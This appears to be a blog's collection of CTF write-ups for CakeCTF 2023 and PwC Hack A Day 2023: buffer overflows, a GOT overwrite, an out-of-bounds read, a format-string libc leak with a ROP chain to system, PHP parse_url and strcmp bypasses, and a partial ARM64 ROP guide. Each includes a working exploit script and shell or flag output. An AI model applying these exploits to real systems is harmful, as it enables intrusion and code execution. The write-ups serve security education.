0x000000000000001e \u0026lt;- $rdi 0x7fffffffcdf8|+0x0018|+003: 0x0000000000000000 0x7fffffffce00|+0x0020|+004: 0x0000000000000000 0x7fffffffce08|+0x0028|+005: 0xc382c9256963b300 \u0026lt;- canary As could be seen, our string is now allocated on the heap.\nSince there is a pointer to a memory address, we could probably overwrite this value with our buffer overflow and point it to __stack_chk_fail@got.plt.\npayload = b\u0026#34;\u0026#34; payload += p64(win) payload = payload.ljust(0x130, b\u0026#34;\\x00\u0026#34;) payload += p64(stack_chk_fail_got) With this payload, we actually got a SIGSEGV and looking at the call stack, it is trying to call free which hints us on operator= trying to allocate our input on the heap. However, our input is only 3 bytes long as NULL bytes are not counted. This is weird. Guess, this is a perfect time to look at how operator= works.\n-\u0026gt; 0x7fdbf5c3d8d7 498b4608 \u0026lt;_int_free+0x1b7\u0026gt; mov rax, QWORD PTR [r14 + 0x8] [!] Cannot access memory at address 0x8050d8 [Thread Id:1] Name: \u0026#34;bofww\u0026#34;, stopped at 0x7fdbf5c3d8d7 \u0026lt;_int_free+0x1b7\u0026gt;, reason: SIGSEGV [#0] 0x7fdbf5c3d8d7 \u0026lt;_int_free+0x1b7\u0026gt; [#1] 0x7fdbf5c404d3 \u0026lt;free+0x73\u0026gt; (frame name: __GI___libc_free) [#2] 0x7fdbf5f4182d \u0026lt;std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_mutate(unsigned long, unsigned long, char const*, unsigned long)+0xed\u0026gt; [#3] 0x7fdbf5f4288b \u0026lt;std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0xfb\u0026gt; [#4] 0x0000004013b9 \u0026lt;input_person(int\u0026amp;, std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;\u0026amp;)+0xa9\u0026gt; [#5] 0x000000000000 \u0026lt;NO_SYMBOL\u0026gt; Understanding operator=(const char *) # Unfortunately, I could not find the libstdc++ source code for the operator= function (skill issue, probably) and had to instead use ghidra to decompile the file.\nTo easily locate the function address, turn off demangling inside GDB (if you have it turned on) and use the mangled function name _ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc as the search filter.\ngef\u0026gt; set print asm-demangle off gef\u0026gt; x/i 0x00000000004013b4 0x4013b4 \u0026lt;_Z12input_personRiRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE+164\u0026gt;: call 0x4011a0 \u0026lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEPKc@plt\u0026gt; The following is the decompiled code for operator=(const char *). As could be seen, there is a familiar function named _M_replace(). It accepts:\nthe std::string structure as the first parameter, index as the second parameter current string length (offset 0x08) as the third parameter pointer to the new string content as the fourth parameter and lastly, the length of the new string void __thiscall std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator= (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *this,char *new_str) { size_t new_len; new_len = strlen(new_str); _M_replace(this,0,*(ulong *)(this + 8),new_str,new_len); return; } Looking into _M_replace(), there is the _M_mutate() function which causes the SIGSEGV. To avoid calling _M_mutate(), capacity, which is the value at offset 0x10 (since we overwrote ptr and now ptr != this+0x10), needs to be larger than our input length. Since we have buffer overflow, we could control the value at offset 0x10 as well which make the program goes into the else block and finally execute the memcpy() function, where the destination is the overwritten ptr value plus index (which is always 0) and the source is our input value.\nbasic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; * __thiscall std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::_M_replace (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *this,ulong index, ulong cur_size,char *new_str,ulong new_len) { basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *__dest; ulong _new_len; ulong capacity; ulong idk; long _cur_size; basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *ptr; _cur_size = *(long *)(this + 8); if (new_len \u0026lt;= (cur_size + 0x3fffffffffffffff) - _cur_size) { ptr = *(basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; **)this; _new_len = (new_len - cur_size) + _cur_size; if (ptr == this + 0x10) { /* inline string (on stack) */ capacity = 0xf; } else { capacity = *(ulong *)(this + 0x10); } if (capacity \u0026lt; _new_len) { // \u0026lt;=== avoid this _M_mutate(this,index,cur_size,new_str,new_len); } else { __dest = ptr + index; idk = _cur_size - (index + cur_size); if ((new_str \u0026lt; ptr) || (ptr + _cur_size \u0026lt; new_str)) { if ((idk != 0) \u0026amp;\u0026amp; (cur_size != new_len)) { if (idk == 1) { __dest[new_len] = __dest[cur_size]; } else { memmove(__dest + new_len,__dest + cur_size,idk); } } if (new_len != 0) { if (new_len == 1) { *__dest = (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;)*new_str; } else { memcpy(__dest,new_str,new_len); // \u0026lt;=== target } } } else { _M_replace_cold(this,(char *)__dest,cur_size,new_str,new_len,idk); } } *(ulong *)(this + 8) = _new_len; *(undefined *)(*(long *)this + _new_len) = 0; return this; } /* WARNING: Subroutine does not return */ __throw_length_error(\u0026#34;basic_string::_M_replace\u0026#34;); } Solution # Let\u0026rsquo;s briefly recap on our analysis:\ninput_person() function is subjected to buffer overflow std::string contains a pointer to memory address at offset 0x00 this pointer could be overwritten w/ buffer overflow to point to __stack_chk_fail@got.plt and our input would be used to populate this GOT entry simply overwriting this pointer is not enough as the operator= function calls into _M_mutate() which causes segmentation fault need to overwrite std::string structure at offset 0x10 to be larger than our input length (calculated with strlen) to avoid the _M_mutate() function calls #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./bofww\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc bofww.2023.cakectf.com 9002\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() win = 0x4012f6 stack_chk_fail_got = elf.got[\u0026#34;__stack_chk_fail\u0026#34;] payload = b\u0026#34;\u0026#34; payload += p64(win) payload = payload.ljust(0x130, b\u0026#34;\\x00\u0026#34;) payload += flat( stack_chk_fail_got, 0, 0x3 # std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0x4a --\u0026gt; need to be \u0026gt;= strlen(_name) # noqa ) io.sendline(payload) io.sendline(b\u0026#34;1337\u0026#34;) io.interactive() ‚ûú ./solve.py [*] Switching to interactive mode What is your first name? How old are you? $ ls Dockerfile docker-compose.yml libstdc++.so.6.0.32 readme.md bofww flag.txt main.cpp solve.py $ cat flag.txt CakeCTF{n0w_try_w1th0ut_w1n_func710n:)} $ ","date":"16 November 2023","permalink":"/posts/cakectf-2023/pwn/bofww/","section":"My Average Blog","summary":"Buffer overflow into arbitrary address write via std::string \u003ccode\u003e=\u003c/code\u003e operator","title":"bofww"},{"content":"","date":"16 November 2023","permalink":"/categories/cakectf-2023/","section":"Categories","summary":"","title":"CakeCTF 2023"},{"content":" Author: ptr-yudai\nDescription: Memorial Cabbage Unit 3\nAttachment: memorial-cabbage.tar.gz\nSource Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define TEMPDIR_TEMPLATE \u0026#34;/tmp/cabbage.XXXXXX\u0026#34; static char *tempdir; void setup() { char template[] = TEMPDIR_TEMPLATE; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); if (!(tempdir = mkdtemp(template))) { perror(\u0026#34;mkdtemp\u0026#34;); exit(1); } if (chdir(tempdir) != 0) { perror(\u0026#34;chdir\u0026#34;); exit(1); } } void memo_r() { FILE *fp; char path[0x20]; char buf[0x1000]; strcpy(path, tempdir); strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026#34;/memo.txt\u0026#34;); if (!(fp = fopen(path, \u0026#34;r\u0026#34;))) return; fgets(buf, sizeof(buf) - 1, fp); fclose(fp); printf(\u0026#34;Memo: %s\u0026#34;, buf); } void memo_w() { FILE *fp; char path[0x20]; char buf[0x1000]; printf(\u0026#34;Memo: \u0026#34;); if (!fgets(buf, sizeof(buf)-1, stdin)) exit(1); strcpy(path, tempdir); strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026#34;/memo.txt\u0026#34;); if (!(fp = fopen(path, \u0026#34;w\u0026#34;))) return; fwrite(buf, 1, strlen(buf), fp); fclose(fp); } int main() { int choice; setup(); while (1) { printf(\u0026#34;1. Write memo\\n\u0026#34; \u0026#34;2. Read memo\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); if (scanf(\u0026#34;%d%*c\u0026#34;, \u0026amp;choice) != 1) break; switch (choice) { case 1: memo_w(); break; case 2: memo_r(); break; default: return 0; } } } Initial Analysis # At a glance, the program seems to not have any vulnerability. The setup() function creates a temporary directory under /tmp and save the directory name to tempdir. Both memo write and read have proper size constraints to prevent buffer overflow and would operate on a file named memo.txt under tempdir.\nNext, my plan is to just fill up buf with 0xfff bytes of cyclic pattern and observe any interesting outcome.\ngef\u0026gt; x/s (char*)tempdir 0x7ffd9aab6920: \u0026#34;/tmp/cabbage.FSWsBP\u0026#34; gef\u0026gt; ni gef\u0026gt; x/s (char*)tempdir 0x7ffd9aab6920: \u0026#34;bovabowaboxabo\u0026#34; Turns out that our input overwrites part of tempdir. This happens because mkdtemp returns char * that is pointing to the stack and when the setup() returns, the string /tmp/cabbage.FSWsBP is located in the stack area which would be used to allocate local variables when another function is called. In this case, when memo_w is called, the memory which would be allocated for buf overlaps with tempdir, which allows us to overwrite the path value.\ngef\u0026gt; x/5i memo_w+59 0x55565ba76502 \u0026lt;memo_w+59\u0026gt;: mov rdx,QWORD PTR [rip+0x2b17] # 0x55565ba79020 \u0026lt;stdin@GLIBC_2.2.5\u0026gt; 0x55565ba76509 \u0026lt;memo_w+66\u0026gt;: lea rax,[rbp-0x1010] 0x55565ba76510 \u0026lt;memo_w+73\u0026gt;: mov esi,0xfff 0x55565ba76515 \u0026lt;memo_w+78\u0026gt;: mov rdi,rax 0x55565ba76518 \u0026lt;memo_w+81\u0026gt;: call 0x55565ba76180 \u0026lt;fgets@plt\u0026gt; gef\u0026gt; x/gx $rbp-0x1010 0x7ffd9aab5930: 0x6161616261616161 gef\u0026gt; p/x 0x7ffd9aab5930+0x1000 $6 = 0x7ffd9aab6930 Solution # Now that we are able to overwrite the value of tempdir and the memo path is constructed everytime memo_r is called, we could overwrite tempdir to be /flag.txt\\x00. Since the length of /flag.txt\\x00 is shorter than TEMPDIR_TEMPLATE, when strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026quot;/memo.txt\u0026quot;) is called, our NULL termination stays and fopen() would open /flag.txt, instead of /flag.txtgarbage/memo.txt\nWhen testing locally, make sure that the running user has no write permission to /flag.txt since memo_w would not return early and instead overwrite the content of /flag.txt. Final solve script:\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./cabbage\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc memorialcabbage.2023.cakectf.com 9001\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() io.sendline(b\u0026#34;1\u0026#34;) io.sendline(cyclic(0xff0) + b\u0026#34;/flag.txt\\x00\u0026#34;) io.sendline(b\u0026#34;2\u0026#34;) io.interactive() ‚ûú ./solve.py REMOTE HOST=localhost PORT=9001 [+] Opening connection to localhost on port 9001: Done [*] Switching to interactive mode 1. Write memo 2. Read memo \u0026gt; Memo: 1. Write memo 2. Read memo \u0026gt; Memo: FakeCTF{*** REDACTED ***} 1. Write memo 2. Read memo \u0026gt; $ ","date":"16 November 2023","permalink":"/posts/cakectf-2023/pwn/memorial-cabbage/","section":"My Average Blog","summary":"Overwriting \u003ccode\u003emkdtemp\u003c/code\u003e return path","title":"Memorial Cabbage"},{"content":"","date":"8 November 2023","permalink":"/tags/format-string/","section":"Tags","summary":"","title":"format string"},{"content":"Initial Analysis # When we try to run the binary file, we are first prompted to enter a 4-digit password. Looking at the decompilation output, the password is hardcoded in password_checker() function, i.e., 1235\n__int64 __fastcall password_checker(int password) { __int64 result; // rax if ( password == 1235 ) { puts(\u0026#34;Login Successfully\\n\u0026#34;); result = 1LL; } else { if ( password \u0026lt;= 999 || password \u0026gt; 9999 ) puts(\u0026#34;Please Enter 4 digit numbers!\\n\u0026#34;); else puts(\u0026#34;Invalid password!\\n\u0026#34;); result = 0LL; } return result; } Next, we could see that inside management_system() function, we could see that we are allowed to query an item whose ID is less than or equal to 14. However, notice that there is no check for negative item ID and the variable data type is a signed integer.\nvoid __fastcall management_system() { int input; // [rsp+4h] [rbp-Ch] unsigned int j; // [rsp+8h] [rbp-8h] unsigned int i; // [rsp+Ch] [rbp-4h] while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\u0026#34;--- Welcome to the Management System ---\u0026#34;); puts(\u0026#34;1. User List \u0026#34;); puts(\u0026#34;2. Item List \u0026#34;); puts(\u0026#34;3. Search for Item Storage \u0026#34;); puts(\u0026#34;4. Exit\u0026#34;); printf(\u0026#34;Enter your choice: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input != 1 ) break; for ( i = 0; (int)i \u0026lt;= 17; ++i ) printf(\u0026#34;UserID - %d %s\\n\u0026#34;, i, userlist[i]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 2 ) break; for ( j = 0; (int)j \u0026lt;= 14; ++j ) printf(\u0026#34;ItemID - %d %s\\n\u0026#34;, j, item[2 * (int)j]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 3 ) break; printf(\u0026#34;Please Enter item ID: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input \u0026lt;= 14 ) printf(\u0026#34;\\nStorage of %s: %s\\n\\n\u0026#34;, item[2 * input], off_4888[2 * input]); else puts(\u0026#34;Invalid item ID!\\n\u0026#34;); } if ( input == 4 ) break; puts(\u0026#34;Invalid Input!\u0026#34;); } } This means that we could provide a negative item ID, e.g., -4, and it would access memory address lower than item and return the value there. Looking at interesting things that we could read with negative item ID, we could see that there is a variable named secret which contains the flag.\nSolution # Now that we know we could read the flag by providing a negative item ID, the next step is to calculate the exact value to properly access the flag. To do this, we could simply subtract the distance between item and secret and then divides the value by 16.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() item = elf.sym[\u0026#34;item\u0026#34;] secret = elf.sym[\u0026#34;secret\u0026#34;] delta = (item - secret) // 16 log.info(f\u0026#34;{delta=:#x}\u0026#34;) io.sendlineafter(b\u0026#34;numbers): \u0026#34;, b\u0026#34;1235\u0026#34;) io.sendlineafter(b\u0026#34;choice: \u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;ID: \u0026#34;, str(delta * -1).encode()) io.recvuntil(b\u0026#34;Storage of \u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-1/","section":"My Average Blog","summary":"Array OOB read","title":"Hack the Binary 1"},{"content":"Initial Analysis # The given binary file is almost similar to Hack the Binary 1, but without the flag lying around in the memory and array OOB. Instead, the login() function is now susceptible to format string attack. Furthermore, it is also subjected to buffer overflow as the scanf format is not restricted by length.\n__int64 login() { __int64 result; // rax char format; // [rsp+Ah] [rbp-6h] do { printf(\u0026#34;Please Enter Password (4 digit numbers): \u0026#34;); __isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); printf(\u0026#34;Your Password is \u0026#34;); printf(\u0026amp;format); // \u0026lt;=== format string !!! putchar(10); result = password_checker(\u0026amp;format); } while ( (_DWORD)result != 1 ); return result; } Solution # The first step is to leak the stack and look for any interesting address, particularly the one that points to libc memory space since we want to call system() later on to pop a shell. The format string that would be discussed in this writeup is %n$llx where n specify the stack offset and llx for 64-bit value in hex format.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() for i in range(1, 16): leak = printf_leak(i) log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) io.interactive() Based on the result, the third entry is a libc address value.\nOne could also double check where is the libc memory region via /proc/\u0026lt;pid\u0026gt;/maps Since the challenge does not come with a libc file, we could not directly compute the offset between the leaked address with the base address of libc. The local libc used in this writeup is of version 2.35-0ubuntu3. Now, if we try to run it against the remote server, we could see that the lowest 3 nibbles (hex digit) is different (local is a37, remote is a77). We only compare the lowest 3 nibbles since ASLR does not affect these 3. This means that the remote server is using a different libc version.\nWe need to check if the leaked address belongs to any libc function such that we could use the known symbol as a lookup value on libc database like:\nhttps://libc.rip https://libc.blukat.me Now, if we attached gdb to the process (that is running local binary), we could see that the address lies within __GI___libc_write.\nIf we try to use the symbol name __GI___libc_write with the address 0xa37-23 = 0xa20, libc.rip returns us results. However, there is no 2.35-0ubuntu3. This means that the symbol name is not quite right.\nIf we try to break at the beginnning of the function, gef (gdb plugin) labels the function as write.\nNow, if we use replace the symbol name with write instead, we get more results and 2.35-0ubuntu3 is among them.\nNext, we just need to replace the address value with the one that we got from remote server, i.e., 0xa77-23 = 0xa60. If we diff the results between __GI___libc_write 0xa60 and write 0xa60, we could deduce that libc6_2.35-0ubuntu3.4_amd64 is probably the correct one. Click on the result and we could see various offsets, e.g., write, system, str_bin_sh, etc. With the offset of write, we could compute the libc base address on the remote side and then use the base address to locate system function address within the process memory and various other stuffs. Another thing that we need is also a pop rdi; ret; gadget which does not exist in the binary file, but is available from the libc file.\nFinal solve script:\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() # for i in range(1, 16): # leak = printf_leak(i) # log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) libc_leak = printf_leak(3) libc.address = libc_leak - 0x114a60 - 23 log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) pop_rdi = libc.address + 0x001bc0a1 ret = pop_rdi + 1 bin_sh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) payload = b\u0026#34;A\u0026#34; * 6 payload += p64(elf.bss(0xc00)) payload += flat( pop_rdi, bin_sh, ret, # stack alignment libc.sym[\u0026#34;system\u0026#34;] ) io.sendline(payload) io.sendline(b\u0026#34;1235\u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-2/","section":"My Average Blog","summary":"Format string to defeat ASLR, ROP to get RCE","title":"Hack the Binary 2"},{"content":"","date":"8 November 2023","permalink":"/tags/oob/","section":"Tags","summary":"","title":"oob"},{"content":"Source Code # This is a rough overview of the source code but is enough for solving the challenge \u0026lt;?php include \u0026#39;flag.php\u0026#39;; if (isset($_GET[\u0026#39;debug\u0026#39;])) { highlight_file(__FILE__); } if (isset($_GET[\u0026#39;url\u0026#39;])) { $url = $_GET[\u0026#39;url\u0026#39;]; $parsed = parse_url($url); if ($parsed[\u0026#39;host\u0026#39;] == \u0026#34;www.google.com\u0026#34; \u0026amp;\u0026amp; ($parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;http\u0026#34; || $parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;https\u0026#34;)) { echo file_get_contents(str_replace(\u0026#34;../\u0026#34;, \u0026#34;/\u0026#34;, $url) . \u0026#34;?flag=\u0026#34; . $flag); } else { die(\u0026#34;Forbidden\u0026#34;); } } ?\u0026gt; Initial Analysis # From the source code above, we could see that it requires us to provide a URL that satisfy the criterias. Searching on the internet on how to bypass parse_url host leads us to this page.\nBased on the PoC, for PHP \u0026lt; 5.6.28, the parse_url incorrectly parses the host component. We could trick parse_url to think that www.google.com is the host, but in fact, the real host is a webhook for us to retrieve the flag. However, this does not work for us since if we look at the response header, it is stated that the server is running PHP version 8.2.12.\nSeems like there is no way for us to trick the parse_url but to work with www.google.com\nLooking at www.google.com # If we provide https://www.google.com as the url query value, we could see that it just returns the page with an empty search box.\nIf we go to google and try to search up, e.g., pwc hackaday 2023, it would redirect us to this URL: https://www.google.com/search?q=pwc+hackaday+2023\u0026amp;....\nNow, if we try to visit https://www.google.com/search?q=hello+world directly, we end up with this page.\nLooking back at the source code, we could see that the argument passed to file_get_contents is our provided url appended with ?flag=. If our provided url already contains ?foo=bar, then the appended ?flag= would lose its ? original syntax meaning and instead be treated as the continuation of our initial foo parameter key value, i.e., foo = bar?flag=\nSolution # Before we continue, let\u0026rsquo;s recap back on our findings:\nparse_url host confusion is not possible due to mismatch PHP version If our provided url already contains ? which signify the starting of query string, then the appended ?flag would lose its ? meaning The Google search endpoint /search query key q value is reflected back to the search box Now, putting everything together, we could provide url as https://www.google.com/search?q= and the flag would be appended into https://www.google.com/search?q=?flag=..., which means that ?flag=... would show up inside the Google search box.\n","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-1/","section":"My Average Blog","summary":"Leveraging Google search box to capture the flag","title":"PHP Code Review 1"},{"content":"Source Code # This is only a part of the source code \u0026lt;?php // php 8.2.12 // // if ?debug, highlight __FILE__ to view source code $username = $_GET[\u0026#39;username\u0026#39;]; $passwd = $_GET[\u0026#39;password\u0026#39;]; $alg = $_GET[\u0026#39;alg\u0026#39;]; $pwlist = array(\u0026#39;admin\u0026#39; =\u0026gt; \u0026#34;REMOVED\u0026#34;, \u0026#34;editor\u0026#34; =\u0026gt; \u0026#34;REMOVED\u0026#34; ); function hashing($passwd, $alg) { try { if (!isset($alg)) { $alg = \u0026#34;md5\u0026#34;; } $alg = strval(trim($alg)); $passwd = strval($passwd); if ($alg != \u0026#34;md5\u0026#34; \u0026amp;\u0026amp; $alg != \u0026#34;sha256\u0026#34;) { die(\u0026#34;invalid algorithm\u0026#34;); } return hash($alg, $passwd); } catch (Throwable) { return; } } if (isempty($username) || isempty($passwd)) { die(\u0026#34;empty username or password\u0026#34;); } if (!strcmp(hashing($passwd, $alg), $pwlist[$username])) { // set cookie with value of xor($username, $flag) } ?\u0026gt; Initial Analysis # From the source code above, it is apparent that we need to pass the strcmp checks, such that we could retrieve the flag from the cookie. The first argument is the hash digest of our provided password (MD5 or SHA256) and the second argument comes from the initialized array. Since the value of the array is not fully known, it is almost impossible for us to guess the username\u0026rsquo;s hashed password.\nHowever, notice that if we provide a username that does not exist in the array, $pwlist[$username] would just return NULL. Looking at the hashing() function, we could see that there are two code paths, one that returns hash($alg, $passwd), and another path that returns NULL. Since we could make the second argument to be NULL, it would be great if we could get the hashing() function to return NULL as well.\nAnalysis of hashing() # The code path which returns NULL, require us to trigger an error somewhere inside the try block. There are three function candidates, i.e., isset, strval, and trim. After trial-and-error, the trim() function would raise an error when an array is passed as the argument.\nWe could re-confirm this behaviour by passing an array to hashing() and observe that it indeed returns nothing as opposed to normal argument like md5 and sha256.\nSolution # Here is the summary of our findings:\nOur goal is to pass the strcmp checks We could make the second argument to return NULL using non-existing username We could make the first argument to return NULL by triggering an error via the trim() function by passing it an array such that the catch block is reached To pass an array via HTTP query string, we just need to append the parameter name with [], e.g., ?alg[]=abcd. Since the cookie value is our supplied username XOR with the flag and base64 encoded, and we do not know the length of the flag beforehand, we could just supply a really long username\nThe final payload to get the server to set the cookie is:\nhttp://\u0026lt;url\u0026gt;?username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026amp;password=deadbeef\u0026amp;alg[]= ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-2/","section":"My Average Blog","summary":"Triggering error to reach \u003ccode\u003ecatch\u003c/code\u003e block","title":"PHP Code Review 2"},{"content":"","date":"8 November 2023","permalink":"/categories/pwc-ctf-hack-a-day-2023-securing-ai/","section":"Categories","summary":"","title":"PwC CTF: Hack A Day 2023 - Securing AI"},{"content":"","date":"8 November 2023","permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP"},{"content":"","date":"25 July 2023","permalink":"/tags/arm64/","section":"Tags","summary":"","title":"ARM64"},{"content":" Work in progress. Note # Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug aarch64 (ARM64) # Tools # References: https://docs.pwntools.com/en/stable/qemu.html\nDebugging (choose either one):\ngdb-multiarch: sudo apt-get install gdb-multiarch gcc toolchain (with gdb): https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/ Running:\nqemu: sudo apt-get install qemu-user-static libs: sudo apt-get install libc6-arm64-cross installs to /usr/aarch64-linux-gnu/ Running the binary\n# non-debug mode qemu-aarch64-static ./binary # debug mode (gdbserver) on port 1234 qemu-aarch64-static -g 1234 ./binary # in case of the loader not provided (`ld-linux-aarch64.so.1`), use the loader from `libc-arm64-cross` qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./binary Attach debugger with GEF\ngef‚û§ gef-remote --qemu-user localhost 1234 Assembly # References: http://blog.perfect.blue/ROPing-on-Aarch64\nRegisters # x0 to x7 are used to pass arguments x29 is equivalent to rbp in x86 x30 stores return address Function Prologue # Pre-indexed performs the offset operation then the assembly instruction:\nAdd N to sp (sp = sp + N) Stores old frame pointer, x29, to [sp] and return address, x30, to [sp + 8] stp x29, x30, [sp, #N]! ; pre-indexed [base, #offset]! mov x29, sp Function Epilogue # Post-indexed performs the assembly instruction then the offset operation\nLoad [sp] to x29 and [sp + 8] to x30 Add N to sp (sp = sp + N) ldp x29, x30, [sp], #N ; post-indexed [base], #offset Stack Layout # +--------------------------+ ^ Lower memory address | callee\u0026#39;s saved x29 | | +--------------------------+ | | callee\u0026#39;s saved x30 | | +--------------------------+ | Stack growth direction | callee\u0026#39;s local variables | +--------------------------+ | caller\u0026#39;s saved x29 | +--------------------------+ | caller\u0026#39;s saved x30 | +--------------------------+ | caller\u0026#39;s local variables | +--------------------------+ Higher memory address Unlike in x86 where saved rbp and rip are below the local variables which allow us to overwrite the saved rip and immediately return to our desired address, in ARM64 we overwrite the callers\u0026rsquo;s return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address\nSolution # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * ld = ELF(\u0026#34;./ld-linux-aarch64.so.1\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;) def start(argv=[], *a, **kw): global flag_path host = args.HOST or \u0026#39;generic-rop-challenge.chal.imaginaryctf.org\u0026#39; port = int(args.PORT or 42042) if args.REMOTE: flag_path = b\u0026#34;/home/user/flag.txt\\x00\u0026#34; return remote(host, port) if args.GDB: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, \u0026#34;-g\u0026#34;, str(debug_port), elf.path]) else: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, elf.path] + argv, env=env, *a, **kw) env = {} qemu = \u0026#34;/usr/bin/qemu-aarch64-static\u0026#34; debug_port = 1234 flag_path = b\u0026#34;\u0026#34; io = start() pad = 80 - 0x10 main_x29 = b\u0026#34;BBBBBBBB\u0026#34; bss = elf.bss(0x200) csu_1 = 0x400948 csu_2 = 0x400928 def ret2csu(w0, x1, x2, func_ptr, next_gadget): payload = b\u0026#34;A\u0026#34; * pad + main_x29 + p64(csu_1) payload += flat(bss, p64(csu_2)) payload += flat(0, 1) # x19, 